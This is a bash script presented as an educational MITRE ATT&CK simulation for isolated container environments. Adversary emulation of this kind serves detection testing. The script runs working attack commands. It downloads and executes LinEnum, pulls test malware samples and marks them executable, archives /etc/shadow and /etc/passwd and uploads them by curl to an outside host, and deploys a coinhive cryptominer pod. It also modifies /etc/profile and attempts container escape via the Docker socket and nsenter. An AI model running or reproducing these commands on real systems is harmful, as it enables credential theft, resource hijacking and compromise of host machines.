#!/bin/bash

# MITRE ATT&CK Technique Simulation Script
# This script runs a sophisticated simulation aligned with MITRE ATT&CK techniques.
# It is intended for educational purposes and should only be executed in secure, isolated environments such as containerized Kubernetes clusters.

# MITRE Techniques covered:
# T1078 - Valid Accounts
# T1071 - Application Layer Protocol
# T1082 - System Information Discovery
# T1560 - Archive Collected Data
# T1021 - Remote Services
# T1496 - Resource Hijacking
# T1574 - Hijack Execution Flow
# T1071.001 - Network Traffic Generation for Firewall Alerts
# Additional Enumeration, Malware Downloads, and Container Escape Attempts

# Set up environment variables
DOWNLOAD_DIR="/tmp/attack_scenarios"
mkdir -p $DOWNLOAD_DIR

# Function to run a scenario
function run_scenario() {
    local description=$1
    local command=$2
    echo "\nRunning scenario: $description"
    echo "------------------------------------------------------------"
    eval $command
    echo "------------------------------------------------------------\n"
}

# Function to generate network traffic to trigger sample firewall alerts
function generate_network_traffic() {
    local description="Generating Network Traffic for Firewall Alerts (T1071.001)"
    echo "\nRunning scenario: $description"
    echo "------------------------------------------------------------"
    for i in {1..10}; do
        local src_ip="192.168.1.$((RANDOM % 254 + 1))"
        local dst_ip="192.168.2.$((RANDOM % 254 + 1))"
        local src_port="$((RANDOM % 65535 + 1))"
        local dst_port="$((RANDOM % 65535 + 1))"
        local protocol="tcp"
        echo "Simulating traffic: S.IP=${src_ip}, S.Port=${src_port}, D.IP=${dst_ip}, D.Port=${dst_port}, Protocol=${protocol}"
        curl -s -o /dev/null "http://${dst_ip}:${dst_port}" --local-port ${src_port} &
        sleep 1
    done
    echo "------------------------------------------------------------\n"
}

# Scenario 1: System Information Discovery (T1082)
run_scenario "System Information Discovery (T1082)" \
    "uname -a && lscpu && df -h && cat /etc/os-release && hostname"

generate_network_traffic

# Step 1: Download Enumeration Script using wget or curl
run_scenario "Downloading Enumeration Script (LinEnum)" \
    "if command -v wget >/dev/null 2>&1; then \
        wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/enum_script.sh; \
    elif command -v curl >/dev/null 2>&1; then \
        curl -o /tmp/enum_script.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh; \
    else \
        echo '[-] Neither wget nor curl is available. Exiting.'; exit 1; fi"

# Step 2: Make the Enumeration Script Executable
run_scenario "Making the Enumeration Script Executable" \
    "chmod +x /tmp/enum_script.sh"

# Step 3: Run the Enumeration Script
run_scenario "Running the Enumeration Script (LinEnum)" \
    "sh /tmp/enum_script.sh"

generate_network_traffic

# Scenario 2: Network Connection Using Application Layer Protocol (T1071)
run_scenario "Network Connection Using Application Layer Protocol (HTTP) (T1071)" \
    "curl -I http://example.com"

generate_network_traffic

# Step 4: Download Sample Files from WildFire for Testing Purposes
run_scenario "Downloading Malware Samples from WildFire" \
    "if command -v wget >/dev/null 2>&1; then \
        wget https://wildfire.paloaltonetworks.com/publicapi/test/pe -O /tmp/pe_sample; \
        wget https://wildfire.paloaltonetworks.com/publicapi/test/apk -O /tmp/apk_sample; \
        wget https://wildfire.paloaltonetworks.com/publicapi/test/macos -O /tmp/macosx_sample; \
        wget https://wildfire.paloaltonetworks.com/publicapi/test/elf -O /tmp/elf_sample; \
    elif command -v curl >/dev/null 2>&1; then \
        curl -o /tmp/pe_sample https://wildfire.paloaltonetworks.com/publicapi/test/pe; \
        curl -o /tmp/apk_sample https://wildfire.paloaltonetworks.com/publicapi/test/apk; \
        curl -o /tmp/macosx_sample https://wildfire.paloaltonetworks.com/publicapi/test/macos; \
        curl -o /tmp/elf_sample https://wildfire.paloaltonetworks.com/publicapi/test/elf; \
    fi"

# Step 5: Make the Downloaded Samples Executable
run_scenario "Making the Downloaded Samples Executable" \
    "chmod +x /tmp/pe_sample /tmp/apk_sample /tmp/macosx_sample /tmp/elf_sample"

generate_network_traffic

# Scenario 3: Creating an Archive with Collected Data (T1560)
run_scenario "Creating Archive of System Logs (T1560)" \
    "tar -czvf $DOWNLOAD_DIR/system_logs.tar.gz /var/log/*"

generate_network_traffic

# Scenario 4: Using Valid Accounts for Privileged Actions (T1078)
run_scenario "Simulating Use of Valid Accounts (T1078) - Accessing Sensitive Directories" \
    "if [ "$(id -u)" -eq 0 ]; then echo 'Accessing sensitive directory as root'; ls /root; else echo 'Not running as root'; fi"

generate_network_traffic

# Scenario 5: Remote Service (SSH) Access (T1021)
run_scenario "SSH Access Simulation to Another Container or Node (T1021)" \
    "ssh -o StrictHostKeyChecking=no user@127.0.0.1 -p 2222 'hostname && whoami'" # Replace with a dummy IP and appropriate credentials.

generate_network_traffic

# Scenario 6: Cryptominer Deployment - Resource Hijacking (T1496)
run_scenario "Deploy Cryptominer Container (T1496 - Resource Hijacking)" \
    "kubectl run cryptominer-example --image=rkjnsn/coinhive-miner:latest --restart=Never"

generate_network_traffic

# Scenario 7: Hijack Execution Flow by Injecting Malicious Script (T1574)
run_scenario "Injecting Malicious Script to Hijack Execution Flow (T1574)" \
    "echo 'echo Malicious activity detected' >> /etc/profile && source /etc/profile"

generate_network_traffic

# Scenario 8: Unauthorized File Access and Exfiltration (T1020)
run_scenario "Unauthorized File Access and Exfiltration Simulation (T1020)" \
    "tar -czvf $DOWNLOAD_DIR/sensitive_data.tar.gz /etc/passwd /etc/shadow && curl -T $DOWNLOAD_DIR/sensitive_data.tar.gz http://example.com/upload"

generate_network_traffic

# Scenario 9: Running a Container in Privileged Mode (T1068 - Exploitation for Privilege Escalation)
run_scenario "Running a Container in Privileged Mode (T1068 - Privilege Escalation)" \
    "docker run -d --name privileged-container --privileged nginx:alpine"

generate_network_traffic

# Additional Scenario: Container Escape Attempts
run_scenario "Attempting Container Escape Scenarios" \
    "if [ -S /var/run/docker.sock ]; then \
        echo '[!] Docker socket found. Attempting escape using Docker client...'; \
        docker run -v /:/host --rm -it busybox chroot /host sh; \
    fi; \
    if grep -q 'docker' /proc/1/cgroup; then \
        echo '[!] Privileged container detected. Attempting escape via host PID namespace...'; \
        nsenter -t 1 -m -u -n -i sh; \
    fi; \
    if mount | grep -q '/host'; then \
        echo '[!] Host filesystem is mounted. Attempting to access sensitive directories...'; \
        ls /host/etc /host/root /host/var; \
    fi"

generate_network_traffic

# Cleanup function to remove all created artifacts
function cleanup() {
    echo "\nCleaning up..."
    rm -rf $DOWNLOAD_DIR
    docker rm -f cryptominer-example privileged-container
    kubectl delete pod cryptominer-example --ignore-not-found
}

trap cleanup EXIT

# Summary and Warning
cat << EOF

This script has demonstrated a series of advanced MITRE ATT&CK techniques, including:
1. System Information Discovery (T1082).
2. Network connection using HTTP for communication (T1071).
3. Archiving collected data (T1560).
4. Using valid accounts for privileged actions (T1078).
5. Remote SSH service access (T1021).
6. Deploying a cryptominer for resource hijacking (T1496).
7. Hijacking execution flow using injected malicious scripts (T1574).
8. Unauthorized file access and exfiltration (T1020).
9. Running a container in privileged mode (T1068).
10. Generating additional network traffic to trigger sample firewall alerts (T1071.001).
11. Container escape attempts including Docker socket abuse and namespace manipulation.

These scenarios are strictly for educational purposes in secure, isolated environments and should never be used in production environments.
EOF
